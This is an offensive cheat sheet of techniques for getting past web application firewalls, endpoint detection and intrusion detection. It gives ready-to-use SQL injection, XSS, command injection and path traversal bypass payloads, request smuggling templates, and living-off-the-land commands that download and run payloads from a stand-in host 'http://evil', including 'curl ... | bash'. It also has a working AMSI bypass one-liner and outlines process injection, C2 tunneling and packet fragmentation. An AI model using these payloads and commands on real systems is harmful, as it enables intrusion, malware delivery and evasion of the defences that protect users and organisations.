# WAF/EDR/IDS Bypass & Evasion Techniques

## WAF BYPASS — UNIVERSAL TECHNIQUES

### 1. Encoding & Obfuscation
```
URL Encoding (double/triple):
  ' OR 1=1--        → %27%20OR%201%3D1--
  Double:           → %2527%2520OR%25201%253D1--
  
Unicode/UTF-8:
  <script>          → %u003Cscript%u003E
  ' OR              → ＇ OR (fullwidth apostrophe U+FF07)

HTML Entity:
  <script>          → &#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
  Mixed:            → &#x3C;script&#x3E;

Hex Encoding:
  /etc/passwd       → /etc/\x70\x61\x73\x73\x77\x64
  
Null Bytes:
  file.php%00.jpg   (bypass extension check)
  sel%00ect         (split keyword)
```

### 2. HTTP Protocol-Level Evasion
```
Request Smuggling (CL.TE / TE.CL):
  POST / HTTP/1.1
  Content-Length: 6
  Transfer-Encoding: chunked
  
  0\r\n\r\nPOST /admin...

HTTP/2 Downgrade:
  H2 frame with smuggled HTTP/1.1 request in body
  CONTINUATION frame abuse for header buffer overflow

Chunked Transfer Manipulation:
  Transfer-Encoding: chunked
  a\r\n
  SEL        (chunk 1)
  \r\n3\r\n
  ECT        (chunk 2 — WAF sees chunks, not "SELECT")

Method Override:
  X-HTTP-Method-Override: PUT
  X-Original-Method: DELETE
  _method=PATCH (body parameter)

Header Injection:
  X-Forwarded-For: 127.0.0.1  (bypass IP whitelist)
  Host: internal-api.local     (route to internal service)
  Content-Type manipulation     (multipart boundary tricks)
```

### 3. SQL Injection WAF Bypass
```
Comment Splitting:
  SEL/**/ECT * FR/**/OM users
  /*!50000SELECT*/ (MySQL version comments)

Case Alternation:
  SeLeCt, sElEcT (only works on weak WAFs)

String Concatenation:
  MySQL:  CONCAT('SEL','ECT')
  MSSQL:  'SE'+'LE'+'CT'
  Oracle: 'SE'||'LE'||'CT'
  
Scientific Notation:
  1e0UNION SELECT → parsed as 1e0 UNION SELECT

Whitespace Alternatives:
  UNION%09SELECT, UNION%0ASELECT, UNION%0DSELECT
  UNION(SELECT, UNION[SELECT (bracket notation)
  
No-Space Techniques:
  'OR'1'='1 (no spaces needed)
  UNION(SELECT(1),2,3)
  
JSON/XML in SQL:
  ' AND JSON_EXTRACT(col, '$.key')='val'--
  
Alternative Functions:
  substring → mid, substr, left, right
  ascii → ord, hex
  benchmark → sleep, pg_sleep
  
HPP (HTTP Parameter Pollution):
  ?id=1&id=UNION&id=SELECT    (different servers concat differently)
```

### 4. XSS WAF Bypass
```
Event Handler Abuse:
  <img src=x onerror=alert(1)>
  <svg/onload=alert(1)>
  <body onpageshow=alert(1)>
  <marquee onstart=alert(1)>
  <details open ontoggle=alert(1)>
  <video><source onerror=alert(1)>

Tag Mutation:
  <svg><script>alert&#40;1&#41;</script>
  <math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>
  
JavaScript URI:
  <a href="javascript:alert(1)">
  <a href="javas&#x09;cript:alert(1)">
  
Template Literal:
  ${alert(1)}
  `${alert(1)}`
  
Encoding Chains:
  <img src=x onerror="&#x61;lert(1)">
  <img src=x onerror="alert(1)">
  
DOM-based (bypass server-side WAF entirely):
  document.location.hash → eval
  postMessage → innerHTML
  URL fragment → document.write
```

### 5. Command Injection WAF Bypass
```
Concatenation:
  c'a't /etc/passwd
  c""at /etc/passwd
  c\at /etc/passwd
  
Variable Expansion:
  ${IFS} instead of space: cat${IFS}/etc/passwd
  $'\x63\x61\x74' /etc/passwd (bash ANSI-C quoting)
  
Wildcards:
  /???/??t /???/p??s??  (= cat /etc/passwd)
  /???/b??/b?s? -c 'id'
  
Alternative Commands:
  curl instead of wget
  nc instead of bash reverse shell
  python -c instead of direct command
  
Newline Bypass:
  cmd1%0Acmd2 (URL-encoded newline)
  cmd1\ncmd2
  
Subshell:
  $(whoami)
  `whoami`
  $({cat,/etc/passwd})
  
Time-based Blind:
  ;sleep${IFS}5
  |sleep${IFS}5
  `sleep 5`
```

### 6. Path Traversal WAF Bypass
```
Double Encoding:
  ..%252f..%252f → ../../
  
UTF-8 Overlong:
  %c0%ae%c0%ae%c0%af → ../

Null Byte:
  ../../etc/passwd%00.jpg

OS-specific:
  ..\..\windows\system32\config\sam (Windows backslash)
  ....//....//etc/passwd (double dot-dot)
  ..;/..;/etc/passwd (Tomcat specific)
  
Encoding Mix:
  ..%c0%af..%c0%af (mixed UTF-8 + path)
  ..%ef%bc%8f..%ef%bc%8f (fullwidth slash)
```

---

## EDR/AV EVASION

### 1. Living Off the Land (LOLBins)
```
Windows:
  certutil -urlcache -split -f http://evil/payload.exe
  bitsadmin /transfer job http://evil/payload.exe c:\temp\p.exe
  mshta javascript:a=GetObject("script:http://evil/payload.sct")
  rundll32 javascript:"\..\mshtml,RunHTMLApplication"
  regsvr32 /s /n /u /i:http://evil/payload.sct scrobj.dll
  
Linux:
  curl http://evil/payload | bash
  wget -qO- http://evil/payload | sh
  python3 -c "import urllib.request; exec(urllib.request.urlopen('http://evil/p').read())"
  perl -e 'use Socket;...' (perl reverse shell)
```

### 2. AMSI Bypass (Windows)
```
Reflection-based:
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

Patch-based:
  Write-Host bypasses (PowerShell downgrade to v2)
  Memory patching of AmsiScanBuffer

String obfuscation:
  $a='Ams'; $b='iUt'; $c='ils'; [type]"$a$b$c"
```

### 3. In-Memory Execution
```
Process Injection:
  - CreateRemoteThread
  - QueueUserAPC
  - Process Hollowing
  - Module Stomping
  
Reflective Loading:
  - PE reflection (no disk touch)
  - Shellcode injection via VirtualAlloc + CreateThread
  - .NET Assembly.Load from memory
  
Syscall Evasion:
  - Direct syscalls (bypass ntdll hooks)
  - Indirect syscalls (jump through ntdll gadgets)
  - HellsGate / HalosGate patterns
```

### 4. Network Evasion
```
Protocol Tunneling:
  DNS tunneling (dnscat2, iodine)
  ICMP tunneling
  HTTP/S over custom ports
  WebSocket for C2

Traffic Blending:
  Use legitimate cloud services (AWS S3, Azure Blob, Google Drive)
  Domain fronting (deprecated but alternatives exist)
  CDN-based C2 (Cloudflare Workers, AWS CloudFront)
  
Encryption:
  Custom encryption over HTTP
  Certificate pinning for C2
  JA3/JA4 fingerprint rotation
```

---

## IDS/IPS EVASION

### 1. Fragmentation
```
IP Fragmentation:
  Split payload across multiple IP fragments
  Tiny fragment attack (8-byte fragments)
  Overlapping fragments

TCP Segmentation:
  Split HTTP request across multiple TCP segments
  Send bytes in reverse order with reassembly
  TTL-based evasion (different TTL = different path)
```

### 2. Timing-Based
```
Slow attacks:
  Slowloris (many partial connections)
  RUDY (slow POST body)
  
Interval variation:
  Random delays between scan probes
  Spread reconnaissance over hours/days
  Mimic legitimate traffic patterns
```

### 3. Payload Obfuscation
```
Polymorphic shellcode:
  XOR with random key (prepend decoder stub)
  AES-encrypted payload with runtime decrypt
  
Custom encoding:
  Base85, custom alphabet base64
  Multiple encoding layers
  Format-specific encoding (Unicode in LDAP, entities in XML)
```
